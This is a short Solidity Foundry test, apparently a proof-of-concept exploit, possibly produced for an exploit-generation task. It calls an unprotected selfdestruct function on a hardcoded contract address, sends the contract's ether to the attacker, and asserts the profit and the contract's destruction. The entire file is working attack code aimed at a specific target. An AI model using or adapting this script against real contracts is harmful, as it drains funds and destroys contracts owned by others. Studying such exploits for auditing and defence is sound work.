// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IVictim {
    function destroy(address payable recipient) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF2A7429641d1b49a13dCB7E23b67a1a5101231F2;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        deal(TARGET, 10 ether);
        assertEq(TARGET.balance, 10 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        uint256 balanceBefore = attacker.balance;

                // Call the unprotected selfdestruct function
                IVictim(TARGET).destroy(payable(attacker));

                // Assert that the attacker's balance has increased and the contract is destroyed
                assertGt(attacker.balance, balanceBefore, "Attacker's balance should have increased");
                assertEq(TARGET.code.length, 0, "Target contract should be destroyed");
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

